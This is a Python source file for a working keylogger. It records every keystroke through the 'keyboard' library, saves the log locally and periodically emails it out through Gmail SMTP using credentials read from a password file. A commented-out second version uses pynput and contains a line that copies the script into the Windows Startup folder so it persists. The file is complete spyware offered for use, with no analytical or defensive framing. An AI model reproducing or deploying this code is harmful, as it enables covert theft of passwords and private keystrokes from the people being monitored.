import keyboard
import smtplib
import sys
import os

from threading import Semaphore, Timer

with open(os.path.join(sys.path[0], 'password.txt'), 'r') as f:
    file = f.readlines()
    email = file[0]
    password = file[1]
    interval = file[2]

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.semaphore = Semaphore(0)

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

        f = open("log.txt", "w")
        f.write(self.log)
        f.close()

    def sendmail(self, email, password, message):
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        if self.log:
            self.sendmail(email, password, self.log)
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()
        self.semaphore.acquire()


if __name__ == "__main__":
    keylogger = Keylogger(interval=interval)
    keylogger.start()

# import logging
# import os
# from shutil import copyfile

# from pynput.keyboard import Listener

# username = os.getlogin()
# # Moved to hidden folder
# logging_dir = os.getcwd()

# #copyfile('logger.py', f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/')

# logging.basicConfig(filename=f'{logging_dir}/mylog.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')

# def key_handler(key):
#     key = str(key).replace("'", "")

#     if key == 'Key.space':
#         key = ' '
#     if key == 'Key.shift_r':
#         key = ''
#     if key == "Key.enter":
#         key = '\n'

#     logging.info(key)

# with Listener(on_press=key_handler) as listener:
#     listener.join()
